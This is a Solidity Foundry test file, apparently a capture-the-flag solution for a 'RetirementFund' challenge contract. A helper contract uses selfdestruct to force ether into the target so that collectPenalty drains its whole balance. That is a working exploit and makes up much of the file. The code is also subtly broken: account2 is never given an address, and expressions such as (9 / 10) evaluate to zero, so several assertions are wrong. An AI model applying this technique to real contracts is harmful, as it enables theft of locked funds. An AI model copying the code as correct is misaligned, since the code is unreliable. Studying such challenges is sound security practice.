// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "source/math/RetirementFund.sol";

contract DestroyContract {
  address payable targetContract;

  constructor(address payable _targetContract) payable {
    targetContract = _targetContract;
  }
  function destroy() external {
      selfdestruct(payable(targetContract));
  }
}

contract RetirementFundTest is Test {

  RetirementFundChallenge retirementFundChallenge;
  RetirementFundChallenge retirementFundChallenge2;

  address account1;
  address account2;

  function setUp() public {
    account1 = vm.addr(1);
    vm.label(account1, "Account1[address]");
    vm.deal(account1, 1 ether);
    vm.label(account2, "Account2[address]");
    vm.deal(account2, 5 ether);

    vm.startPrank(account1);
    retirementFundChallenge = new RetirementFundChallenge{value: 1 ether}(account1);
    vm.label(address(retirementFundChallenge), "RetirementFundChallenge[contract]");
    vm.stopPrank();

    vm.startPrank(account2);
    retirementFundChallenge2 = new RetirementFundChallenge{value: 1 ether}(account2);
    vm.label(address(retirementFundChallenge2), "RetirementFundChallenge2[contract]");
    vm.stopPrank();
  }


  function testCorrectWithdraw() public {

    // use account1 and first instance of contract
    vm.startPrank(account1);

    // before - locked up 1 ether in contract, account 1 has 0
    uint expectedAccountBalance = 0 * (1 ether);
    assertEq((account1.balance), expectedAccountBalance );
    uint expectedContractBalance = 1 * (1 ether);
    assertEq(address(retirementFundChallenge).balance, expectedContractBalance );

    // we locked 1 ether up, withdraw early and we lose a tenth (10%) of it
    retirementFundChallenge.withdraw(); 

    // check balances after withdraw, contract keeps 10%.
    expectedAccountBalance = (1 ether) * (9 / 10) ;
    assertEq((account1.balance), expectedAccountBalance);
    expectedContractBalance = (1 ether) * (1 / 10);
    assertEq(address(retirementFundChallenge).balance, expectedContractBalance );

    console.log(account1.balance);
    console.log(address(retirementFundChallenge).balance);

    vm.stopPrank();
  }


  function testAttackWithdraw() public {
    // use account2 and second instance of contract
    vm.startPrank(account2);

    retirementFundChallenge2.withdraw(); 
    // contract has kept 10%

    // we attack by calling a self destruct on the contract, via another contract.
    // since this destroys the contract the locked up ether gets sent back
    address payable payableTarget = payable(address(retirementFundChallenge2));
    DestroyContract destroyContract = new DestroyContract{value: 1 ether}(payableTarget); 
    destroyContract.destroy();

    retirementFundChallenge2.collectPenalty();

    // have we done it?  Pulled out all the ether in the target contract!
    assertTrue(retirementFundChallenge2.isComplete());

    //comfirm balances
    uint expectedAccountBalance = (5 ether);
    assertEq((account2.balance), expectedAccountBalance);
    uint expectedContractBalance = (0 ether);
    assertEq(address(retirementFundChallenge2).balance, expectedContractBalance);


    //console.log(address(retirementFundChallenge2));
    //console.log(address(payableTarget));
    console.log(account2.balance);
    console.log(address(retirementFundChallenge2).balance);
    vm.stopPrank();
  }

  fallback() external payable { }
  receive() external payable { }
}

